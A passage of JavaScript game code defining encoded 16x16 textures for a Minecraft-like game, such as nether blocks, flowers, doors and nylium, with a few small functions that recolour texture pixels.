		netherBricks: "0g0g7oMW;HQJYwTH(ZEY-Z000000BmQJKBA0+0+A}7PAbPAP%_030326uuddJ_JTTAJAJTA",
		redNetherBricks: "0g0g7$0WTHY)0WQgH-gHUMW000000BmQJKBA0+0+A}7PAbPAP%_030326uuddJ_JTTAJAJTA",
		netherQuartzOre: "0g0gcHUWYYWSHY#YZ4WZW12NQO)MjMBzQ5Ow>>l@wN))^GT3zPQQAM4@PO>3Q)T5C>!N)KOQzPR))k,@QN@5SRi3>A-4-(k)P@mSzQx))Oy)R)lzQO",
		netherrack: "0g0g7HUWYYWSH4W4Cp%IOR6g)?ph+e#s7)XU2)@s}2M?@e*o][oM]}{VrP*.r",
		netherWartBlock: "0g0g60WgW0WWYW5waP8PEQEJJTw5A8h4lA2EJh#0PwxAP)2QyhFRiS0PwiTAg5w]492aQX?^2]ki?2SAP4]FR])X]B2",
		quartzBlockBottom: "0g0g3HZY05?150V0V01VU10050060500V051S01",
		quartzBlockSide: "0g0g6ZHZYWY0000005AJ{9+JV%A%A+9+P9yP4J^PA4]J|9+AJV4JPB+4J4|y|9CAJV%)AJAJ_",
		quartzBlockTop: "0g0g6ZHZYWY0000005AJ{9+JV%A%A+9+P9yP4J^PA4]J|9+AJV4JPB+4J4|y|9CAJV%)AJAJ_",
		quartzPillar: "0g0g4WHZYh&tiu&%u&%x%%&yy%uuhiuy%&%tt",
		quartzPillarTop: "0g0g5WYYHZ546P490FDs)J.rJ@1JP8Qi^*i^FjkF2^?kD4?i2C^QkTJP81.AJ@PDAJ)F0J90J8k|y",
		chiseledQuartzBlock: "0g0g6YHZYWZ4Ja]+]5Bri]9,A0id4d9wJ09_PFi210JxA|AJPi@4kPB.{4wJ0]X]mJ]Dw0id*%AA49CC",
		chiseledQuartzBlockTop: "0g0g5YHZWZ4MJh46gB1EgD2-zg+T0biiRRK0020(JiJJPAJPA00p039kpz8,2+w@RwRk8h1giRJ",
		chiseledStoneBricks: "0g0g7ZEYYZYWY00]0Rd+&A!090e2e7J!n)&ck!nE)aIB)eLEe!dJA2S0J:;$PAJPA",
		smoothStone: "0g0g7ZH-ZYWWZ42Byg&,qOsJ+my|sp*|Pm%&.+d[qlN:x5wiSJg",
		soulSand: "0g0g6jYSH)W]ZQHW4A3{4hBCyFcMItT]dIUdp(Kq3C3Rc+KPR(qyoI}No{RwRwA^T$4-pTd",
		glowstone: "0g0g8HlHRYiWZZZZYYNH5+T%^Yb?g_m2wKb~>r$e+FDDn5j#_yl",
		andesite: "0g0g6ZHZEZYY461a2BwA]V+pe0^j6Rc!Td|+4({*C!S+r)gVSi$m3c)",
		diorite: "0g0g6EYWWY;ZY4P)yR,g+E?bX_{o|i+]ohFM2TQpbjKNxR+lAA(&nj^wX6c+Ng",
		granite: "0g0gaWYWUH{ZDHH3HWaZ1xMihTmioMjMjNnhiCMnlnihmNhNjzGwyjh+jygMMmhjOjh1A,MylxjNhMCM+ljm2MEh,+nj>h+RRNMhMzhFiMDNxhozigMh2yMMh+",
		polishedAndesite: "0g0g9ZZ.ZEHWWWYPW11hhh1gijQ>O),jOO)SIO[38Q)O,jO*NQQ,k>)Q*OQ@jOX-Iy)k>QQUO+jEO-8j>)>)>N,j-XQIO,mOOOIOIjI)Q(jOQQOQ,kQ]O)>,GGGGGG",
		polishedDiorite: "0g0g8HYW$YYWW-Y0i00J25+_5@VAkKE$z%)x!)5iC}cTy92$mMQ-$%dB]}cI1ddjm9!(tC",
		polishedGranite: "0g0g9WWDHHYWUH3H{Z00gwy2zz4VQU)QV?kk>)QR[4QVUOV@4QQ>VQQCUVQQU@5>)QQQ4QQ@U>)@B@QOQVBAQ?U?UQ@lQQQQAV@4TVQQ@4OQQ>)V[BU?QU>+AQUQVQT[GIGGGI",
    portal: "0g0guS7YU8YQ7Z-6Z-6Y(6W)6H(4Z(5Y;7H(5H(4H(4Y)4W)6YS7H(5Z{8H-7W8Y(5W]8W8Z(4W9W;7WKpH8H)3ZKpW0QNkx4g0B)wtaT0Na[.tRo:emIQPgpPk*yNygjtwFNq$I4*gt!sgNmI8M$z|6&Gq$-5?TJlFp_kI",
		obsidian: "0g0g540Y00WgMZ-HAZ4Jg&1s4y8BQl8&B28MAPA8Pi19]E6g]5)AJBJIASSg20cE4RdJdJ40a]0K(4w9g]SkQ00",
    redstoneDust: "0g0g40=00=$I0=1UlS5Ull1U2200U00B1?01h40?5U1)B00B0m!5l1UlS",
    redstoneDustOn: "0g0g500=0=$0=0=001w00001w00009A00A0AA0yPX0iJAzJPAP0iS0mJ0yXJ0APA0APFA009w00001w00",
    bufferMiddle:"0g0g58wwIww001w00001w00001w00001w00001w00001w000JPAJS0ki00i002000Q000_00009A00001w00001w00001w00",
    bufferTop:"0g0g88wwwwwww001w00001w00001w00009A0000^Q00200iiSABP0AP0iiS02]002Q000^A00009w00001w00001w00",
    soup:"0g0gaw[={=B0000gw003(00000000000w2000020000300S00w00(00000033050000060000w300000w006800000000000000520003600030804000000000w000000000",
    soup2:"0g0gy0=y;{!!;Kw;z;%!=y3;|;|;[=!Qy@;;852|;@;EAwe100RcSkKs0wARPAwE@(4ARw3[g(>4;2RS(7A_$wQQ9TAJgbA4p(P[Ab$o|[gPooK|[oXAc+7Qk{>E(({0+[$oK_oT2g0oV-gT4kMVXhJP0+oUTkv<w1X(Il7D",
    soup3:"0g0gs>000}FAc}F;w)B)Fw;!FA(E>}B6KE%F$)FAwEE36;B60QMXQg^zox8Qxx!ixF^o@hKT!hhXC00Xx!!]cPj^z?,18x_*8RpSA8{J62>t*4+up%*np%obr6p@Tqag(w",
    soup4:"0g0ga;;L;ML;00;;I0;0;;;000000000g0yh0hg0gwhw00(0g0000(004T21gO00506hj30V063h00V0300VgG000VVgG100lV10h0801g9g00000g0h00g80h090h0100000",
    randomSoup:function(n) {
			let r = 0, g = 0, b = 0
			for (let x = 0; x < 16; x++) {
				for (let y = 0; y < 16; y++) {
					r = Math.random()*255
					g = Math.random()*255
					b = Math.random()*255
					setPixel(n, x, y, r, g, b)
				}
			}
		},
    redStain:"0g0gg0;0)0$0C0u0m0c08020a0k0q0w0A0E0g1z?1z?1z?1z?1z?1z?1z?1z?1z?1z?1z?1z?1z?1z?1z?1z?",
    invis:"0g0g200030000(0=0>;YKZ60",
    "poision potion":"0g0g4000;00;f;0000000001S009K008w00b00b00L-00Y00Y00Y00L00a0000000000000",
    darkLeaves: "0g0g6.ZAZ<W000%3WMOY01gA240z4C0An02AwcSEc4%01J0^mgSgk10SA2r2|3K]2{w82Ni",
		redBerryLeaves: function(n) {
			let pix = getPixels("0g0g5VY000H?ZH0ANiCSIP2EJ]TgmEUTxa2m|9Mk2BI8A(9zp^mTj1^2KS0K5y8?yswQg4ECi]0Sg?y");
      for (let i = 0; i < pix.length; i += 4) {
        setPixel(n, i >> 2 & 15, i >> 6, pix[i]*0.5, pix[i + 1]*1.2, pix[i + 2]*0.5, pix[i + 3]);
      }
      pix = getPixels("0g0g4000)Z0WKW0000000000S0b2$f0;0000000000000o000o00$0000000016006e0f3000")
      for (let i = 0; i < pix.length; i += 4) {
        if (pix[i+3]>0) {
          setPixel(n, i >> 2 & 15, i >> 6, pix[i], pix[i + 1], pix[i + 2], pix[i + 3]);
        }
      }
		},
		blueBerryLeaves: function(n) {
			let pix = getPixels("0g0g5VY000H?ZH0ANiCSI32!2F918ckUTxSi?CRA9kiNm{8A^2Tz1]0jwTz0E94Fmw6ixgE+(h]S0Sg?y");
      for (let i = 0; i < pix.length; i += 4) {
        setPixel(n, i >> 2 & 15, i >> 6, pix[i]*0.5, pix[i + 1]*1.2, pix[i + 2]*0.5, pix[i + 3]);
      }
      pix = getPixels("0g0g4000PWxHx/W01000600b0600gb0000o$00000000000K000000000406E0b0$0000000")
      for (let i = 0; i < pix.length; i += 4) {
        if (pix[i+3]>0) {
          setPixel(n, i >> 2 & 15, i >> 6, pix[i], pix[i + 1], pix[i + 2], pix[i + 3]);
        }
      }
		},
		//https://replit.com/@Carson-Sernick/carsoncraft?v=1#textures/block/birch_leaves1.png
		autumnLeaves: "0g0g6000HW4WZQW4X90Qhi2T9]60UC9QA0^iRQq5yK1Cr0+wF]UT%90|0]241BS4)2]AK0021]",
		yellowLeaves: "0g0g6W0W000KWWwW4JAaQBy^]2]92S]|]{dBPCAySQJJQ1J]2^91+^P&BBAoA^i0A_PiRr]0!3QJ",
    allium: "0g0ga000HZWWZ/W^NYZZlH0000000000000000000i(000001TB00000kkM0000xxz00003iN000000w0000006000000070000000800000008000000070000000700000006000000090000",
		azureBluet: "0g0g7000YZZHZZ^NY00000000000000000000000000000000000000100000w0000d000Cb00/M000dK0000000000500006000",
		blueOrchid: "0g0g8000LWZ!ZZCHu|H^NYZlH00000000000000000000000000a00000000K600C0b0000K00-0001Q00S(Q0000&00007000000000000",
		cornFlower: "0g0gb000WW?YeYF;HSY%HW)ZW<H000000000000000000000000000000000011z00000xiNw00003QS00000600000080000000K000000000008000000a00000000000060000000K000",
		dandelion: "0g0g8000ZZZYHWlH^NYZ000000000000000000000000000000000000000000001w0000a0000I000cQ000050001G0000L00070000600",
		lilac: [
			"0g0g9000dW~WWZZZ^NYlH00000000000000000i0003g00M(00x(002)03j0000>04(00005K[0000000000000>x01x067(00jS5S0004X10h000[(1z00003S]S000g0SX0001w0000",
			"0g0g9000WdWlHZZZ^NY~W01x3S1y001*6000,*00000E00000lg00000051Ew00E0*i000jgV002x5GS000y(60000h000000V40iw0000400007O000000(0000000(000"
		],
		lilyOftheValley: "0g0g8000H5YWZZZHRZY*W000000000000000000000000020000-50000;E0000a00{U00{0A00030003000000000000Z000000",
		orangeTulip: "0g0g8000HWWlH^NYZZ000000000000000000008w00009S0000qK00003000004k0001Q00010001000100010000L0000L00004000",
		oxeyeDaisy: "0g0gb000ZHYHZYZZHZlHZ0000000000000000000i(000003Nz00000N?g0000yRw0000j?(00003yO000000Ng0000008000000a000000900000009000000a000000800000090000",
		peony: [
			"0g0ga000YHvZHBH~WZxiHBHoZ0000000000000000000000000000000000000g0002y01x000jiw?CN00x+h00ixX005PX000Q]04I000xX000hNnXx000iCy0001V00",
			"0g0ga000BHBHoZxiH~WvZYHHZ00iM>*000g)A*000xG>j0000khz[000)j000V>)x03ikM*S00Oz>>i0004Oj>x01y)jRg00[)z)006A.00003j00004M[00000))000000O(000"
		],
		pinkTulip: "0g0g8000ZvZYH^NYlHZZ000000000000000000008S0000hS0000qK0000300001500001g0001k000100010001;0000=0000C00005000",
		poppy: "0g0g9000ZYJYWxiHBH^NYFY00000000000000000000000000000000000000000000i000000jx(00001)Mw00001hi000000*K000000000000000000000000005K00000V0000005000",
		redTulip: "0g0g9000ZkWJYZYZlH^NY000000000000000000000000000gg000000i(00000SM00000@50000000000004X0[00008@400008@X00007000007X00000000000000000070000",
		roseBush:[
			"0g0gc000JYZYWkWxiHFY^NYBH*NWM1Z000000000001g000000iN000000?x0000h0S1g02Ng0RN01B05x00>0h0S0071zg0000800004K7K0006000000060xg6K002OA0000i00",
			"0g0gc000WxiHFYBH*NWJYZ^NYYkWZ01w3SA000023C000z20(RNqG08wNp068R#00zKGEpm:pIFK10Ei>A004zNw000zXEN(008N-AzI000AEA(003OEEzO0"
		],
		whiteTulip: "0g0g8000HYZlH^NYZZ000000000000000000008S00009S0000qK00003200004n000070000600d000b0001G0000,0000B00004000",
		witherRose: "0g0gb000SZEYkTWoTWwHcYAW.hY$HgY00000000000000000000000000000000000000000001i000000jjw00000?BS000004U0000000K000000000000I00008800008000000000000009000",
    purpleFlower: "0g0g8000fZ{nY~ZLY6wW1W3W000000000000000000000000000000001w0000a000E0000cP000t0000700000<00000600000000070000000",
    TallGrass: function(n){
      var pix = getPixels("0g0g7000WY8WHJPWZ00000000000002110S00R1200gcX0424wg18Tg10(1T{SSwXwwyK&x$jK?ess")
      for (let i = 0; i < pix.length; i += 4) {
        let bright = pix[i]
				setPixel(n, i >> 2 & 15, i >> 6, bright, bright, bright, pix[i + 3]);
			}
    },
    
    warpedDoorConnected:[
			"0g0gcyZCZ/8WtVWFHCH/-Z%WY]Wt4WgH0gg11102iyNy4>Ag4)TQ>?gVnRz,[[R>yzJAk>y>wNz>w4+zw[+z7nQ+y>n4y+S3?2yNAlSQU2+K[1>+KGO,NxN?QA",
			"0g0gb]W/8WyZCZtVWFHCH%WgH/-ZY1z?V]IJVGhU?kBV[nUBhTnUx?UnMTnhUylMlPhVMOPVA[NlBn)VllGBVGlVRBQ,5VQ>Bh[U,V.hTllk.TlmUkU??Q?Q"
		],
    spruceDoorConnected:[
			"0g0gcWHiHUZH>W{HNY)H;ZYZ120w20w2hjTM>TA1RhMTA1Rl,UB@FF,,5jxjA5jUBjM5jQD?M4>?D[)kQBn)@1k*lB@1lxkDm1RlMkD@TiMih,..",
    	"0g0ghZNY>WiHW-Z{HHUZWHZYoH)H;ZY0Q(IgRX@-1/8kk]*91-(]MF2-4]Oks@]O7gAs@/XsikI@/Xsae8CPa4kECI8kECv4=60Q(1i2xX@^Og^O1-@/O2-s@(R18k4C"
		],
    oakDoorConnected: [
			"0g0gbVZ4ZWRZH000FH*WHZY1g0100g2iyyyyyyz2>ON>ONz2*V*VA*V*VEJ*V*VziGhGhz2>ON>ONA2*V*VEi*V*Vz2*V*Vz2GhGhA2hiIhiIE2>ON>ONziNyxNCzNyN!]A",
    	"0g0g9YWRZH*WH4ZVZFH1xj)xlUj+Q@+Q@ihOhjMiyxyClxhmxhmjxh)xh)ixj)xj)i+Q@+Q@*OmOOyxNyCixhmxhmi1xh)xh)lxj)xj)j+Q@+Q@NMjMjNBVVVVVVV"
		],
    jungleDoorConnected: [
			"0g0ge@YYiZHYmWYH000)HZYPAY(W0hh0hhg23?VV*UmV,V[lU,z?-*,IoIkIoIj[IIN7G1l1yg0GG036V>II)UR6V,)4VS5)UlQQ)V[l[)?[*>VV)R",
    	"0g0gaZmWYHiZYY@YH)H1hzhh>h)izhh>hyyy@hAyEOOhExEGGMhohAxCNCohxmzEhhiCEh)mihAx-zi>h6Eh@QiOXXh-MiNh-AMm@mo+IQ]IXQI"
		],
    ironDoorConnected: [
			"0g0gbY|W$YWW000|)ZH8WZT4W1g0100g2iyyyyyyz2)QR)QRz2?V?Vz?V?Vz?V?VziGhGhz2)QR)QRz2?V?Vzi?V?Vz2?V?Vz2GhGhz2hihiz2)QR)QRziRyxR!IzRyTR!.z",
    	"0g0ga$Z$YWZHW|WYHT4W1xj)xiAl+Q@+Q@lhOhjMlyxyClxhmxhmlxh)xh)lxj)xj)l+Q@+Q@*OmO-yxNyClxhmxhmo1xh)xh)lxj)xj)l+Q@+Q@-MjMjBIIIIIII"
		],
    darkOakDoorConnected: [
			"0g0gf2Z)WY]H;WSWEKZ2H)HZyH(ZZWWW000000012zOyyyO)2B)3QCQ[)UC?[)JVC?A2VCV)2*+A2O+O/A2O+O/)3N+O!)3y+N!)3y:y!)3y:y!A3#GANOyy;A",
    	"0g0gcZ]HYW;W2ZSWEKZ2HyH)H(Z1yyyyjhAGCGGAQDQ]AD@]AD@knkmnkhnhpkhJnhpAiJnhFAyJDiFk1yJ#yFky#yFkrIkhhhyihk#"
		],
    crimsonDoorConnected: [
			"0g0gaHDW6WYWXYW]HHQW1ixhyihzzO>OO)O)g*S(()3UgSVUV3QQQQQQ[yyyyyzwV0VV5VUgV0VV*VUg0>5(3OjOQOQQQQ7GGGGGGGAQQQ[Q[j)O>[O[gO3O)O,0S0(w0S00J3",
    	"0g0gaHXYWHYQW6W]HDWW1hzjM?Vyxh,ONC,OCnyyyyyyDmhOhhMhkhOhhThkhOAMj>)QAQyQyyyyGGGGGGG4QAQDARQzQORQNOx+hNMihxmiNRQRDDD"
		],
    birchDoorConnected: [
			"0g0geEZ^W8HHHCWZZZQHZHZHZH1hhhhhhgiw02y02zi?VVOO)zizJz3g3g3g:3g;3g;3g:3i+3i+Bg,,",
			"0g0geZEZHZHZH^WYCWZZH8HQH1z)VV>+AQQQQPoBU?oBO^OonnnGninihnsihhnhisnhi1ssonsnGGnsGIIIIII"
		],
    acaciaDoorConnected: [
			"0g0geZYyYYHYZZH000)HZ?WW1h000hhijQ?U?UQ@3GEGEGE@3RFFRFFF3FFF3FF[5[l5F5FFkM0M0M",
    	"0g0gcZHZyYHVVHY000YZ)HY1y)y)y)DDD>DDDj,,,j[[[,,[[,[[,[[[[[[,[[,k1,,,k[[[jjhmhhj)yyOOOQ>"
		],
    
    crimsonDoor: "0g0g7000QWXYWWDWH0000000000000kP00kP00_00JPA00m00kP00Q^00]00kP00kP00_00JPA00m00iPAJ0",
    warpedDoor: "0g0g9000%W/-ZFHCZyZY]WgH000000000000000001y)zy(001Bzy(006zAS007yByS001BNU(004RN>y(006yN>Q(007y)zI(001V)zy(004yzU(006yNByS007QNy(004y?zAS001hhhhg0",
    acaciaDoor: "0g0g5000zWW)H?W0000000000000kJPA00k8A00)8A00k8A00k8A00k8A00)JP00k8A00k8A00k8A00)8A00k8A00kJPA00iPAJ0",
    jungleDoor: "0g0g8000H5Z)HHHPAY(W0000000000000kJPA00kBA00)g00rQg00k^00k200)_00k^00k^00k00)^00r^00k^00iPAJ0",
    birchDoor: "0g0g7000@HEZFYWYZ0000000000000kPA00lBA0000l$A00l$A00l00$00l$00l00lBA00JPA00kJPA00kJPA00iPAJ0",
    darkOakDoor: "0g0g7000(ZYZQHZYW0000000000000kJPA00kPQ00)@Q00k@Q00k@Q00k@Q00)J^00kPQ00k@Q00k@Q00)@Q00k@Q00kJPA00iPAJ0",
    ironDoor: "0g0g7000H;Z|)ZT4WWcW0000000000000kJPA00k0S400)0S400kJPA00k0S400k0S400)J^Q00l00l00kJPA00*00l00kJPA00iPAJ0",
    spruceDoor: "0g0ga000iHHNY(W?W;ZW-ZY000000000000000001zzzzw001zzzzw004001zzzzw001zzzzw001zzzzw004001zzzw001zzzzw001zzzzw004001zzzzw001zzzzw001hhhhg0",
    oakDoor: "0g0g7000WkZYFHHW0000000000000kJPA00k0S400)0S400kJPA00k0S400k0S400)J^)00l00l00kJPA00*00l00kJPA00iPAJ0",
    torch: "0g0gd000ZKW(WZHZZZWHHViZSW;Z-Y)H0000000000000000000000000000000000000000000000000001w0000003S0000005K0000007000000500000050000007000000600000050000006000",
    soulTorch: "0g0gd000OZ2ZZZZZWHHViZSW;Z-Y)H0000000000000000000000000000000000000000000000000001w0000003S0000005K0000007000000500000050000007000000600000050000006000",
    lantern: "0g0gc000<5W?+HRZZwYZQHCHZHZZTBZ1yg000003Q(002h0iyx00150@G00150,I005l0-00000-00150[I005l0iyx00000hh00000ry002h0y#00150y#00000ry00000hh0000000000000",
    soulLantern: "0g0gb000<5W?+HwY2YD%WvcHYWZZZTBZ1yg000002hw002h0iyx00130kVT00130CG003j0D00000D00130mG003j0iyx00000hh00000qy002h0y!00130y!00000qy00000hh0000000000000",
    grassSideGrass: "0g0ghoHH-ZWJPWZ8WZYHYYEYWZHZ0QN813B@Nw#S5wNQ!gl68c03Bw-{Aj3cO40N4>0S42~M4AK2y.P6xKxwEiyw2%CQ2NQ9I4X8w(x{2K4yB9E4I0NQFx0",
    redBerryLeavesNoBerries: function(n) {
			let pix = getPixels("0g0g5VY000H?ZH0ANiCSIP2EJ]TgmEUTxa2m|9Mk2BI8A(9zp^mTj1^2KS0K5y8?yswQg4ECi]0Sg?y");
      for (let i = 0; i < pix.length; i += 4) {
        setPixel(n, i >> 2 & 15, i >> 6, pix[i]*0.5, pix[i + 1]*1.2, pix[i + 2]*0.5, pix[i + 3]);
      }
		},
    beacon: "0g0gaZZZ!W#$WYW_ZZZZZZZZZ000000001hhyyyhj1iyARyxj1yQ?QQyj2AQVVQRz2A?URz1ARz1QUz2?Qj2ARz2A?URz2AQVVQRj1yQQUQyj1yyARyyj1hhyyhhjOOOOOOOO",
    cactusTop: "0g0g9000.YTJWZHNYWHTZ000000001yxyNixg2QRQQQQg2?NVBUw2?@Uw1AQg2*VUw2@@w2@@Uw2?U)w1QUQg2?V?Uw2?U*VB)w1QRkQXQg1ixyyixg00000000",
    cactusSide: "0g0g9000.YNYWPWHTJWHZ1zANi*g6NjNVN>Ng1yxN*K1z+*lBg1Ox*lyO*lNg1OxBiNg1zVj*K1CVj*K6EzBjB6xzBjVgxzNBg1z*Bg1xNBg1zMVyl*g",
    cactusBottom: "0g0g700091WdY,W[YYH0000005AFA]98a:a5g989)<86){6t{aA995JP84PA]000000",
   	glassPaneSide: "0g0g5000Y|YcZH001S00002K00002K00001K00001S00001S00001S00002S00002S00002K00002K00001S00001S0000200002K00001K00",
    glassPaneTop: "0g0g5000Y|YcZH000000000000000000000000000000000000000000FiJQJAPC000000000000000000000000000000000000000000",
    ladder: "0g0g7000WHH*WRZ-Z0002eOcJol1K0050002iOA(l1K0050002iOAJol1K0050002iOcJol1K005",
		vine: function(n){
      var pix = getPixels("0g0g5000OZjHZY0koil04loy010d009oSg1E8phRwom05o0o022lw08001Rd0lwekaeAwgkg01i108EF0")
      for (let i = 0; i < pix.length; i += 4) {
        let bright = (pix[i]+pix[i+1]+pix[i+2])/3
				setPixel(n, i >> 2 & 15, i >> 6, bright, bright, bright, pix[i + 3]);
			}
    },
    
    Water: "0g0g100W",
    Lava: "0g0gpYSZSYWZWHHH2HYSZNZZHYH*ZHHYYNYBZNZY0QNg(Rg03-0j8gtP^Sgx8el]230Rg.0Rg$o0gE2g8i30S0g880Sk7(SEXx3Ag9gT85X6*m4z0M8w826UM(Rx8Ri.8@joE008ig4JX8S6K$F@0C8Aw",
    
    craftingTableTop: "0g0g9oZcwHSZWWWZUH]Y1gzOON10kRATkCT2GIIwB++G+++I+B2GGGwkCT4RAS0gzOON1g",
    craftingTableSide: "0g0ghoZ*HVZW-HW]YWkZAWHRZSZEYYHg(Y0QMM]MS0jM2h900XwIF^ggIS2K2S0M(w00XM4wRx8S22AwXg02FK2tS0(MS0Q;Ay200kx4wRkwS2%K24MI@(IK0QAwAwXh4w2gh54wXx022K",
    craftingTableFront: "0g0ghoZ*HVZW-HW]YWkZHRZSZEYHZZZYg(Y0QMM]MS0jM2h900XwIAyggIS2S2Uw0M(00X54wR(S22XAwX02JS2Jw0X(S0IAy200x4wRn;S2J}S24MI@(K0QAwAwXh4w2gh54wXx02A2UFS",
    
    crimsonNyliumTop: "0g0gb4W0WWZTWYJH0WWZZ0iO?B>Tj0Qk)QVEg?M?[Nh>3[Q8mUM/kzTB30koSU(ox4U.NkS[[3hko(@okT38mi]hS-hkXkVQ(?NhT>08QToC]k)(Mh(?Rk",
    crimsonNyliumSide: "0g0glTWY0WZ0W0WZ0W(ZUYUZJH;(ZWWZZ{HW4W{(Z0Sg8z00g4w2M0zoSMX5F4202FQgxkX.S>T/a>8RgAeFR@*&^B^iFJ}@Bxl:,{s8~D?c@?M><{sFs<_y",
    warpedNyliumTop: "0g0gflWdY<*HTWdHaHdY?We8Y?WaY6HaHTWeH0iO?xBj0mQVFg?TNxh37ixMoD#m30onKlUtx6UoK3xhmn(nm33iihK,hEooo(M_h07nym+nx(Mhm",
    warpedNyliumSide: "0g0gndHaHe8Y<*HeHdYdYaH$W<*YdZ(ZEWUYW;(ZWZZ{H{TW4W{(Z0ShcA00g4pRTIAwSR4(xI>M^6RX)F8kXx]xc%UC}D}_BnFp%{oFpD|P7?E##qn?o",
    warpedStemTop: "0g0gkSZSZdY]We8YQY6HQZ+]Z+oH+oWNW+-ZpVWFZxH]HSZNWQZ02xM(gwagXBaJXM1yq..2q.0F^<(2u..w/*!.hN.L<@!.L.By.F^.Qq.<zqF^.ziuFco.yau.12gX9UJM002x)0gw",
    warpedStemSide: "0g0gpSZSZeW]HdYa6H9YUZ]W66HQYaWSYQZ9YSYaWdZdH;ZSW;Zi+ZdWSH02xES(ow02cE@(w9IgC(e0Xg6S1(}N48i4w@1i492(49e-]gz(8.R58(0g40i0aSAwSR4ms9q?c]@018n01(S24auK3O(0g?aUx0BMow",
    crimsonStemTop: "0g0ghSZSH0WTW{SHYIYHXYHWWYW6WWZ02w0ES0cw9t9}wq05o18R$1XF^(1X$9P!X$MBxX$$qX/z1Xo(1XF^$ioB8Rg%y96%17_w02w0ES0cw",
    crimsonStemSide: "0g0gjSZSHW]H0W(ZIgHUZ]W{SHW(Z0W(ZUSHSYWMWSY02xES(ow02cE@(w9IgC(e0Xg6S1(}N48i4w@1i492(49e-]gz((3.R58(0g40i09SAwSR4^gs9iQKE@018j01(P2598K3(S(IC0{ghw9M0qzwow",
    warpedWartBlock: "0g0g7dHhYhHaHeHe8YdY02I0w10241A208UoQ0{!w0wJ1{804E0h0{5wN9A104809KlQ4^yFSyAU1!pg4yg50g0wg17g1S10",
    shroomlight: "0g0ghSWWW(WzHWZZWjH(WZEWZoWjWZHWZWW0Sx0R38wJQ18F(FP]M{ogQpMP{p3Np6*FNoxqlzsxUcxUt]MFaEskxa^M^x-q{ql^gFcR@wa1F@8SAx",
    polishedBlackstoneBricks: "0g0g6(H|BH;HkMWAZsTY4E8wi0j8ET42T9]0g0_#0_38AI3Ei14j8AkSw]A2T8z?8wgP]_$#2_",
    gildedBlackstone: "0g0gaAZ(HkMW;HQKWSZgZsTYZY|BH1g0whjkTiRwhjMTB7xlgKhh1jG7jO3.4Og004jM04h0SG047h7G1ijnS1hnDgg401G1Mmj,G.lhOMGGjKO06004SOG4DGxng7G201T0",
    chiseledPolishedBlackstone: "0g0g6|BH;HAZ(HkMWsTY0g002RceP!te00Xd6PB|B6t600d5hSk)d5MT)tdNPA56Pd5i_Bt&t0S0t|^AJV",
    blackstone: "0g0g6AZ(HkMW;HsTY|BH4gAxF]A1h%ySJT%4X4x094%4A8A0gxiM]1A8i20g6^XgBKJR401g2Q{wP20gS",
    blackstoneTop: "0g0g5AZ(H;HsTYkMW5yEirKaIa%KI^T2]iik_0xpJR>yrk_]802Aa2+2Qr2I]-QiJiN1e4yo2ITQSSxTP]",
    netheriteBlock: "0g0ga;W(YAZPkYVY|AZ-YT4W|4W$Y1000010ijQQQQ?Q4*VIO4IV*4,VN4*?VM4GVUO+N4,VV,+4*V*M4V?GG+MlVGG04+9lOKlKKlO*V*VVNiyxiyhyy",
    basaltSide: "0g0g5|AZoW-YZ(Z50(wS(iN0(A6c-Q(1wa+icxaJ)xgQ2(6r6rdr+rTs0+2XkQgw6gA46rXo",
    basaltTop: "0g0g7ZH|AZ)WEY;ZoW0A636mK+e{q{qhSJ&5Sd0%415D?JSKoc0wO4TP(~6e]Kwe(wS",
    polishedBasaltSide: "0g0g6(Z-Y|AZHZoW5.jF8-B9-*99+95@B]5QI1AI)I)-6]a-)I!--!--!.jPh",
    polishedBasaltTop: "0g0g7(Z;ZH|AZ)WZEY5C^a#$/+PC.*;#*P*)J,F6^I",
    chain: "0g0g4000AZP@H<lW1g0000000003g001g0000000Q000003g001g0000000003g00",
    warpedTrapdoor: "0g0g7%WtVW/-Z/8W+WFH0004J9wPFJQ$60h8+apFmo&gNiK!uKp!ex$E;gEawaQJPo4J141",
    warpedPlanks: "0g0g7/8WFH/-ZtVW%Wt4WgH4AJ9A080Aw2cJi3aAP2KwoX1_0jA92PAX40czSAA4A4PQiA9cgPNg0AG",
    warpedFungus: "0g0gc000iHWmHYlHlYZ<*YQW]HUZ0000000000000000000000000000000000000000000000000000000001zON>g005jONx006VDlVK006GIK00009000000a000000b000000a000000b000",
    magma: "0g0gaSH(HYYiWWWYHH1z3Aw2z(0Bz6TNGyNNU)liUzxxzywNg2@(3N@zw+06UiXVzAihTlmxzBzwNki(ANR(3Bw26Xz0Bz2Rj(ANTNyUxxV]XzN*iC@(Nkw5z3Bw2k(0z2VNCQNBNV)olUxjxkyK+g2(3+RwN>z02VTz?UxXQ?ilzzw+?(ANi(3w2R2z0xz2>y(NiN>Cl?xTl]zNMym(+oK5z3Aw2TzC(0Ez2NyTNENV-lRUTzB>FhzyBwN2(3Nzw+R06TlzlzUViBi]AzwNl(BN(3xw260Bz6@y@(N?NCXxh@N*Ry(Nlw",
    crimsonFungus: "0g0gg000YJYYWYgYWH]0WY]ZjYW4WW00000000000000000000000000000000000hz000003Ty00004T>00006VQK0007xiK009G00000000a000000c000000e000000f000000e000",
    warpedRoots: "0g0g5000mHiHlHlY000000001E00001E00002i00i08K,01hT800S14S00M00(T0@4010o86016010800T480",
    twistingVines: "0g0g5000lHiHmHlY000000000A00001Q00002(0003y00030000j0000j^0006Q000k(0001i(0001hw000000060006000800",
    twistingVinesPlant: "0g0g5000lYiHlHmH02w0000xS000000a000a0000bP(0001(0001P0004{000s00QA01A0000A0006w0004w0002w00",
    netherSprouts: "0g0g4000mHiHlH0000000000000000000000000000000000000000000001008TwS8yS-O];O",
    crimsonRoots: "0g0g5000iHTZiYjH00000000000000000000000000Sw00048w00)wg00g00I100RwXCI(IwxoT0gSwR0g@9o2851Ic-0",
    weepingVines: "0g0g4000gW0W0W0n00n00600;a00(r000)000c0000000000000000000000000000000000000",
    weepingVinesPlant: "0g0g8000gW0W0WYWJYY02I1g0041pSj)1)10100J0000000B0Di0604S000N00myS00P1J009O800PY900090025(0",
    spruceTrapdoor: "0g0g9NYHHiHUZ>W)H;ZY1zhTxN1zlS*w5ky(UBT,,05S5S5k*kT05ky(UBT2AB(wR2Uy*4gRw13i?4l*w1lM3i(g1jTjhSX[[1lM3i(g1zhTxN1zlS*w",
    oakTrapdoor: "0g0g7]WRYWYW000*W000000F|CgiKg$@E@E@6I%+|%EiSp$8@E@&<F|000000",
    jungleTrapdoor: "0g0gb>HiZYmH5ZH000@Y(WPAYY0h0100g02O>)>O>xjQRUBRUMi>@C)x2)@>w2+w2@Cw3,,,(5RUB?2RC)w2QQw2QC@Qwi)QARQ>xi)G)QGOw2AERw0g0gh01g",
